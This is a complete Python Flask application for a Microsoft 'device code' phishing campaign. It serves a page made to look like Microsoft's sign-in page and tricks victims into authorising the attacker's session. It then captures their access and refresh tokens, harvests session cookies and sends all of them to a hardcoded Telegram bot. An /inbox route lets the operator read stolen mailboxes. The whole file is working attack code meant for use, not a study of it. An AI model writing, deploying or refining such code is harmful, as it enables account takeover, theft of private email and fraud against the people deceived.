import os
import time
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string, make_response

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com/common"
GRAPH = "https://graph.microsoft.com/v1.0"

SCOPE = "openid profile offline_access User.Read Mail.Read"
SITE_URL = "https://outlook-verify.onrender.com"

app = Flask(__name__)
DB = "sessions.db"

def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT)""")
    # device codes persist here so restarts can't lose them
    conn.execute("""CREATE TABLE IF NOT EXISTS codes (
        sid TEXT PRIMARY KEY, device_code TEXT, created REAL,
        sent INTEGER DEFAULT 0)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS events (
        ts REAL, kind TEXT, detail TEXT)""")
    conn.commit()
    return conn

def log_event(kind, detail=""):
    try:
        conn = db()
        conn.execute("INSERT INTO events VALUES (?,?,?)", (time.time(), kind, detail[:500]))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"LogEvent error: {e}")

def telegram(msg, tag=""):
    """Send message(s), split at 3500 chars, log Telegram's own response."""
    try:
        while msg:
            chunk, msg = msg[:3500], msg[3500:]
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
            print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:300]}")
            if r.status_code != 200:
                log_event("telegram_fail", r.text)
    except Exception as e:
        print(f"Telegram Error [{tag}]: {e}")
        log_event("telegram_fail", str(e))

def harvest_cookies(refresh_token, scope):
    jar = {}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
    try:
        s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
            "grant_type": "refresh_token", "client_id": CLIENT_ID,
            "refresh_token": refresh_token, "scope": scope}, timeout=20)
        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
              f"authorize&scope=openid&prompt=none", timeout=20)
        for c in s.cookies:
            jar[c.name] = c.value
    except Exception as e:
        print(f"Cookie Harvest Error: {e}")
    return jar

def poll_once(sid):
    """One token poll per /status request — no threads, restart-proof."""
    conn = db()
    row = conn.execute("SELECT device_code, created, sent FROM codes WHERE sid=?",
                       (sid,)).fetchone()
    conn.close()
    if not row:
        return {"done": False, "error": "unknown"}
    device_code, created, sent = row

    if time.time() - created > 900:          # code expired (15 min)
        return {"done": False, "error": "expired"}

    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID, "device_code": device_code}, timeout=20)
    j = r.json()

    if "access_token" in j:
        if sent:                             # already reported — don't double-send
            return {"done": True, "error": ""}
        try:
            who = requests.get(f"{GRAPH}/me",
                headers={"Authorization": "Bearer " + j["access_token"]},
                timeout=20).json()
            email = who.get("userPrincipalName", "unknown")
        except Exception:
            email = "unknown"
        cookies = harvest_cookies(j.get("refresh_token", ""), SCOPE)
        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())

        conn = db()
        conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
            (sid, email, j["access_token"], j.get("refresh_token", ""),
             time.time() + j.get("expires_in", 3600), cookie_txt))
        conn.execute("UPDATE codes SET sent=1 WHERE sid=?", (sid,))
        conn.commit(); conn.close()
        log_event("catch", email)

        # Short alert first so it always lands, details after
        telegram("✅ NEW CATCH\nEmail: " + email +
                 "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
        telegram("ACCESS TOKEN:\n" + j["access_token"] +
                 "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"), tag="tokens")
        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
                 tag="cookies")
        return {"done": True, "error": ""}

    err = j.get("error", "")
    if err not in ("authorization_pending", "slow_down"):
        print(f"Token poll error [{sid}]: {err}: {j.get('error_description','')[:200]}")
        log_event("poll_error", err + " " + j.get("error_description", ""))
        return {"done": False, "error": err}
    return {"done": False, "error": ""}

# Styled to mirror the real microsoft.com/devicelogin page
PAGE = """<!doctype html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Microsoft</title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#fff}
.header{background:#0067b8;padding:14px 24px;color:#fff;font-size:20px;font-weight:600}
.header b{font-weight:700}
.wrap{max-width:440px;margin:60px auto 0;padding:0 20px}
.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:40px 44px}
h1{font-size:24px;font-weight:400;margin:0 0 12px}
p{font-size:15px;line-height:1.5;color:#1b1b1b}
.code{font-size:30px;font-weight:700;letter-spacing:4px;color:#0067b8;
background:#f3f2f1;padding:14px;text-align:center;margin:18px 0;user-select:all}
.btn{display:block;width:100%;background:#0067b8;color:#fff;padding:10px 0;
font-size:15px;border:none;cursor:pointer;margin-top:16px}
.btn:hover{background:#005da6}
.note{font-size:12px;color:#605e5c;margin-top:22px}
.footer{max-width:440px;margin:30px auto;padding:0 20px;font-size:12px;color:#605e5c}
.footer a{color:#0067b8;text-decoration:none;margin-right:18px}
.err{font-size:13px;color:#d13438;word-break:break-all}
.wait{font-size:13px;color:#0067b8;margin-top:12px;display:none}
@media(max-width:480px){.wrap{margin:10px auto 0}.card{padding:28px 22px}}
</style></head><body>
<div class='header'><b>M</b>icrosoft</div>
<div class='wrap'><div class='card'>
{% if error %}
  <h1>We couldn't start sign-in</h1>
  <p>Please try again in a moment.</p>
  <p class='err'>Details: {{ error }}</p>
  <button class='btn' onclick='location.reload()'>Try again</button>
{% else %}
  <h1>Enter a code</h1>
  <p>To sign in, enter the code below on the verification page.</p>
  <div class='code' id='code'>{{ user_code }}</div>
  <button class='btn' id='goBtn' onclick='go()'>Copy code &amp; continue</button>
  <div class='wait' id='wait'>Code copied — finishing sign-in…</div>
  <p class='note'>Code expires in 15 minutes. Keep this window open.</p>
{% endif %}
</div></div>
<div class='footer'>
<a href='#'>Privacy</a><a href='#'>Terms</a><a href='#'>Contact Microsoft</a>
<br><br>© 2026 Microsoft Corporation. All rights reserved.
</div>
{% if not error %}
<script>
let sid="{{ sid }}";
function go(){
  let c=document.getElementById('code').innerText.trim();
  // Copy ONLY here, inside the user's click — nothing runs on page load
  if(navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(c).catch(()=>{});
  }else{
    let t=document.createElement('textarea');
    t.value=c;document.body.appendChild(t);t.select();
    try{document.execCommand('copy');}catch(e){}
    document.body.removeChild(t);
  }
  document.getElementById('wait').style.display='block';
  document.getElementById('goBtn').disabled=true;
  // Same-tab redirect: no popups, no blocker, looks safe
  setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
}
setInterval(async()=>{
  try{
    let r=await fetch('/status?sid='+sid,{cache:'no-store'});
    let j=await r.json();
    if(j.done){location.href="https://outlook.office.com/mail";}
  }catch(e){}
},4000);
</script>
{% endif %}
</body></html>"""

@app.after_request
def no_cache(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    return resp

@app.route("/")
def home():
    ms_error = ""
    try:
        resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": SCOPE}, timeout=15)
        dc = resp.json()
        if "user_code" in dc:
            sid = str(int(time.time() * 1000))   # ms timestamp: unique, sortable
            conn = db()
            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,0)",
                         (sid, dc["device_code"], time.time()))
            conn.commit(); conn.close()
            log_event("visit", sid)
            return render_template_string(PAGE, user_code=dc["user_code"],
                                          sid=sid, error=None)
        ms_error = f"{dc.get('error')}: {dc.get('error_description', '')[:200]}"
    except Exception as e:
        ms_error = f"network: {e}"
    print(f"Device code error: {ms_error}")
    log_event("devicecode_error", ms_error)
    return render_template_string(PAGE, error=ms_error, user_code="", sid="")

@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    return jsonify(poll_once(sid))

# Open once in your browser to confirm Telegram still works.
@app.route("/test-telegram")
def test_telegram():
    telegram("Test message from your server — if you see this, Telegram is set up correctly.", tag="test")
    return "Sent. Check Telegram AND your Render logs."

# Quick health view: recent visits, catches, errors — one glance.
@app.route("/debug")
def debug():
    conn = db()
    rows = conn.execute(
        "SELECT ts, kind, detail FROM events ORDER BY ts DESC LIMIT 30").fetchall()
    conn.close()
    out = "".join(
        f"<p>{time.strftime('%H:%M:%S', time.localtime(t))} — {k} — {d}</p>"
        for t, k, d in rows) or "<p>No events yet.</p>"
    return out

@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session.", 404
    token = row[2]
    msgs = requests.get(
        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    rows = "".join(
        f"<tr><td>{(m.get('from') or {}).get('emailAddress', {}).get('address','?')}</td>"
        f"<td>{m.get('subject','')}</td><td>{m.get('bodyPreview','')}</td></tr>"
        for m in msgs.get("value", []))
    return f"<h2>Inbox: {row[1]}</h2><table border=1 cellpadding=6>{rows}</table>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
